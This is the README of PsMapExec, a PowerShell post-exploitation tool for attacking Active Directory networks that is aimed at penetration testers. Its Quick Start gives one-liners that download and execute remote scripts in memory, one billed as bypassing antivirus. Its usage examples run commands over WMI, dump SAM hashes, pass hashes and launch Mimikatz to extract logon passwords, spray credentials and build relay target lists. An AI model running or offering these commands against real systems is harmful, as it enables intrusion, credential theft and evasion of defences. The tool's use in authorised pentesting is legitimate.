# PsMapExec

More detailed documentation on how to use PsMapExec is available on Gitbook: https://viperone.gitbook.io/pentest-everything/psmapexec

## What is PsMapExec

A PowerShell tool heavily inspired by the popular tool CrackMapExec. Far too often I find myself on engagements without access to Linux in order to make use of CrackMapExec. 

PsMapExec is used as a post-exploitation tool to assess and compromise an Active Directory environment. 

## What methods does it support

Currently supported  methods (Protocols)

* RDP
* Session Hunting
* SMB
* SMB Signing
* Spraying (Hash, Password)
* WinRM
* WMI

Planned methods

* MSSQL (In testing)
* IPMI
* SNMP
* FTP
* SSH
## Quick Start
### Load the script directly into memory (Bypass AV)
```
IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Invoke-NETMongoose.ps1");IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/The-Viper-One/PsMapExec/main/PsMapExec.ps1")
```
### Load the script directly into memory
```
IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/The-Viper-One/PsMapExec/main/PsMapExec.ps1")
```
\
Execute some commands over WMI
```
PsMapExec -Targets Servers -Username Admin -Password Pass -Method WMI -Command "net user"
```
\
Check RDP access across all systems
```
PsMapExec -Targets All -Username Admin -Password Pass -Method RDP
```
\
Dump SAM over WinRM and Parse the results
```
PsMapExec -Targets Servers -Username Admin -Password Pass -Method WinRM -Module SAM -Option Parse
```
\
Authenticate over WMI with a hash and execute mimikatz
```
PsMapExec -Targets Workstations -Username Admin -Hash [Hash] -Method WMI -Module LogonPasswords -Option Parse -ShowOutput
```
\
Check SMB Signing on all domain systems
```
PsMapExec -Targets All -GenRelayList
```
## Detailed Usage
* https://viperone.gitbook.io/pentest-everything/psmapexec
* https://viperone.gitbook.io/pentest-everything/psmapexec/using-credentials
* https://viperone.gitbook.io/pentest-everything/psmapexec/methods
* https://viperone.gitbook.io/pentest-everything/psmapexec/modules
* https://viperone.gitbook.io/pentest-everything/psmapexec/spray


## Aknowledgements
## Dependencies
PsMapExec has some dependencies that need to be pulled from outside the script itself in order to function.
Primarily these are:
  * Kirby (PowerShell based Kerberos ticket dump)
  * Invoke-Pandemonium (Slightly modified Mimikatz)

Currently, they are pulled from a seperate GitHub repository: https://github.com/The-Viper-One/PME-Scripts \
If you are working within an environment that has no external access or GitHub is blocked by a firewall you will need to clone the scripts in the respository onto the system from which PsMapExec is running from.

PsMapExec does not currently host a HTTP server for these so you will need to use something like HFS: https://www.rejetto.com/hfs/?f=dl
PsMapExec supports pointing to a locally or alternatively hosted server for the script dependencies.
```
PsMapExec -Targets All -Username [User] -Password [Pass] -LocalFileServer [IP]
```
![image](https://github.com/The-Viper-One/PsMapExec/assets/68926315/499ce08a-153f-434c-ae80-9df24afbe5e4)

## Support me
<a href="https://www.buymeacoffee.com/ViperOne" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-blue.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a>


## Example Images

### Command Execution
![image](https://github.com/The-Viper-One/PsMapExec/assets/68926315/e770e2b3-d441-4094-8a14-94848a3b6b74)

### SAM Dump
![image](https://github.com/The-Viper-One/PsMapExec/assets/68926315/f00a5468-ee99-4db3-82f5-e59223ecf219)


### Mimikatz
![image](https://github.com/The-Viper-One/PsMapExec/assets/68926315/a576b9c8-703e-423e-8041-44daca6cf335)

### RDP Access
![image](https://github.com/The-Viper-One/PsMapExec/assets/68926315/ba875e2f-5898-4c10-a33c-7bcb9ef3a2f5)



